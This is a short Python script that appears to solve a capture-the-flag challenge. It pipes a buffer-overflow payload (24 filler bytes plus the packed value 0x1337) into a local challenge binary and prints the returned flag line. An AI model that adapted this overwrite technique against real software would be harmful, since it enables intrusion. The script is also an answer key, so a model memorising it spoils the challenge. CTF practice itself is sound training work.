#!/usr/bin/env python3
from __future__ import annotations

import struct
import subprocess
from pathlib import Path


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    binary = root / "attachments" / "challenge.bin"
    payload = b"A" * 24 + struct.pack("<I", 0x1337)
    proc = subprocess.run([binary], input=payload, capture_output=True)
    for line in proc.stdout.decode(errors="ignore").splitlines():
        if line.startswith("flag{"):
            print(line.strip())
            return
    raise SystemExit("flag not found")


if __name__ == "__main__":
    main()
